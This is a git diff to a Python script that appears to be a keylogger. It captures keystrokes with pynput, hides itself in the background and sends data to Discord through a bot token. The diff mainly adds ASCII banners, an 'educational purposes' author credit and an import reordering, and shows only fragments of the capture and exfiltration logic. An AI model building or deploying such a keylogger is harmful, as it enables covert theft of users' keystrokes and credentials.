@@ -1,3 +1,15 @@
+#╔════╗       ╔═══╗╔═══╗╔╗         ╔═══╗        
+#╚══╗ ║       ║╔═╗║║╔═╗║║║         ║╔═╗║        
+#  ╔╝╔╝╔══╗╔═╗║║ ║║║╚═╝║║║ ╔╗╔╗╔══╗║║ ║║╔═╗ ╔══╗
+# ╔╝╔╝ ║╔╗║║╔╝║║ ║║║╔══╝║║ ║║║║║══╣║║ ║║║╔╗╗║╔╗║
+#╔╝ ╚═╗║║═╣║║ ║╚═╝║║║   ║╚╗║╚╝║╠══║║╚═╝║║║║║║║═╣
+#╚════╝╚══╝╚╝ ╚═══╝╚╝   ╚═╝╚══╝╚══╝╚═══╝╚╝╚╝╚══╝
+#
+#   Github: https://github.com/Zer0plusOne      Discord: @zer0who       Instagram: @sanchez_g2k04                                      
+#This code was made with educational purposes by a ENTI-UB cybersecurity student. [currently in first curse]
+
+
+
 from pynput.keyboard import Listener, Key
 import os
 import setproctitle
@@ -5,8 +17,8 @@ import sys
 import ctypes
 import discord
 import asyncio
-import time
 import threading
+import time
 
 # Startea el programa en segundo plano
 def run_in_background():
@@ -101,3 +113,25 @@ def send_to_discord(channel_id, bot_token):
         # Start el cliente con la token especificada
         client.run(bot_token)
 
+
+
+#      █████                                    ███                                                             
+#   ██████           ██                          ███                                                            
+#  ██   █  █    ██  █  █                          ██                                                            
+# █    █  █    ███ █                              ██                                                            
+#     █  █     ████               ██   ████       ██      ████                                      ███  ████   
+#    ██ ██    █ ██          ███    ██    ███  █   ██     █ ███  █    ████         ████        ███    ████ ████ █
+#    ██ ██   █             █ ███   ██     ████    ██    █   ████    █  ███  █    █  ███  █   █ ███    ██   ████ 
+#    ██ █████             █   ███  ██      ██     ██   ██    ██    █    ████    █    ████   █   ███   ██        
+#    ██ ██ ███           ██    ███ ██      ██     ██   ██    ██   ██     ██    ██     ██   ██    ███  ██        
+#    ██ ██   ███         ████████  ██      ██     ██   ██    ██   ██     ██    ██     ██   ████████   ██        
+#    █  ██    ███        ███████   ██      ██     ██   ██    ██   ██     ██    ██     ██   ███████    ██        
+#       █       ███      ██        ██      ██     ██   ██    ██   ██     ██    ██     ██   ██         ██        
+#   ████         ███     ████    █  █████████     ██    ██████    ██     ██    ██     ██   ████    █  ███       
+#  █  █████        ███  █ ███████     ████ ███    ███ █  ████      ████████     ████████    ███████    ███      
+# █    ███           ███   █████            ███    ███               ███ ███      ███ ███    █████              
+# █                                  █████   ███                          ███          ███                      
+#  █                               ████████  ██                     ████   ███   ████   ███                     
+#   █                             █      ████                     ███████  ██  ███████  ██                      
+#    ██                                                          █     ████   █     ████                        
+#
